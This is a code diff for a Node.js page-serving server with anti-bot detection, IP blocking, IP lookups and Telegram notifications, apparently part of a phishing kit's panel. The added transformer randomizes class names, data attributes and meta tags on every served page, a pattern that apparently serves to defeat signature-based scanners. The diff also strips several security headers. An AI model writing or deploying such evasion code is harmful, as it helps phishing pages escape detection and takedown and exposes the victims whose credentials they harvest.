@@ -12,7 +12,7 @@ import { detectBot, antiBotUtils } from './middleware/antiBot.js';
 import { scanPages } from './utils/pageScanner.js';
 import { getIPDetails, getPublicIP } from './utils/ipUtils.js';
 import { ipManager } from './utils/ipManager.js';
-import HTMLTransformerService from './services/htmlTransformer.js';
+import { createIPBlocker } from './middleware/ipBlocker.js';
 import fetch from 'node-fetch';
 import { 
     sendTelegramNotification, 
@@ -544,6 +544,52 @@ initTelegramService(state.settings);
 await BotLogger.initialize();
 await loadBlockedIPs();
 
+const HTMLTransformer = {
+    transformHTML(html) {
+        try {
+            // Generate nonce for scripts
+            const nonce = crypto.randomBytes(16).toString('base64');
+            let transformedHtml = html;
+
+            // Randomize class names
+            const classMap = new Map();
+            transformedHtml = transformedHtml.replace(/class="([^"]+)"/g, (match, classes) => {
+                const newClasses = classes.split(' ').map(cls => {
+                    if (!classMap.has(cls)) {
+                        classMap.set(cls, `c${crypto.randomBytes(4).toString('hex')}`);
+                    }
+                    return classMap.get(cls);
+                }).join(' ');
+                return `class="${newClasses}"`;
+            });
+
+            // Add random data attributes
+            transformedHtml = transformedHtml.replace(/<([a-zA-Z0-9]+)([^>]*)>/g, (match, tag, attrs) => {
+                if (crypto.randomBytes(1)[0] > 128) {
+                    const randomData = `data-v${crypto.randomBytes(8).toString('hex')}="${crypto.randomBytes(8).toString('hex')}"`;
+                    return `<${tag}${attrs} ${randomData}>`;
+                }
+                return match;
+            });
+
+            // Add nonce to scripts
+            transformedHtml = transformedHtml.replace(/<script/g, `<script nonce="${nonce}"`);
+
+            // Add random metadata
+            const metaTags = [
+                `<meta name="v${crypto.randomBytes(4).toString('hex')}" content="${crypto.randomBytes(8).toString('hex')}">`,
+                `<meta name="t${crypto.randomBytes(4).toString('hex')}" content="${Date.now()}">`
+            ];
+            transformedHtml = transformedHtml.replace('</head>', `${metaTags.join('\n')}\n</head>`);
+
+            return { transformedHtml, nonce };
+        } catch (error) {
+            console.error('HTML transformation error:', error);
+            return { transformedHtml: html, nonce: crypto.randomBytes(16).toString('base64') };
+        }
+    }
+};
+
 // Page serving middleware
 const pageServingMiddleware = async (req, res, next) => {
     try {
@@ -611,54 +657,37 @@ const pageServingMiddleware = async (req, res, next) => {
             return res.redirect('/');
         }
 
-        // Read and transform HTML
-        console.log('Reading page for transformation:', pagePath);
-        const html = await fs.readFile(pagePath, 'utf8');
-        const transformedHtml = await EnhancedHTMLTransformer.transform(html);
+        // Read and transform the HTML file
+        const html = await fs.promises.readFile(pagePath, 'utf8');
+        const { transformedHtml, nonce } = HTMLTransformer.transformHTML(html);
 
-        // Generate session-specific keys
-        const pageKey = crypto.randomBytes(32).toString('base64');
-        const sessionNonce = crypto.randomBytes(16).toString('base64');
-
-        // Set security headers with dynamic nonce
+        // Set security headers
         res.setHeader('Content-Security-Policy', `
             default-src 'self';
-            script-src 'self' 'nonce-${sessionNonce}' https://challenges.cloudflare.com;
+            script-src 'self' 'nonce-${nonce}' https://challenges.cloudflare.com;
             style-src 'self' 'unsafe-inline';
             img-src 'self' data: https:;
             connect-src 'self' wss: https:;
             frame-src https://challenges.cloudflare.com;
         `.replace(/\s+/g, ' ').trim());
 
-        // Set cache and security headers
+        // Set cache control headers
         res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
         res.setHeader('Pragma', 'no-cache');
         res.setHeader('Expires', '0');
         res.setHeader('Surrogate-Control', 'no-store');
         res.setHeader('Content-Type', 'text/html; charset=UTF-8');
-        res.setHeader('X-Content-Security-Key', pageKey);
-        res.setHeader('X-Frame-Options', 'DENY');
-        res.setHeader('X-XSS-Protection', '1; mode=block');
-        res.setHeader('X-Content-Type-Options', 'nosniff');
-
-        // Log successful transformation
-        console.log('Serving transformed page:', {
-            sessionId: clientId,
-            page: requestedPage,
-            transformationTime: Date.now()
-        });
 
         // Send transformed HTML
         res.send(transformedHtml);
 
     } catch (error) {
         console.error('Error in page serving middleware:', error);
-        console.error({
-            errorMessage: error.message,
-            stack: error.stack,
-            requestPath: req.url,
-            clientId: req.query.client_id
-        });
+        // Fallback to original file if transformation fails
+        const pagePath = sessionManager.getPagePath(requestedPath.substring(1));
+        if (pagePath) {
+            return res.sendFile(pagePath);
+        }
         res.redirect('/');
     }
 };
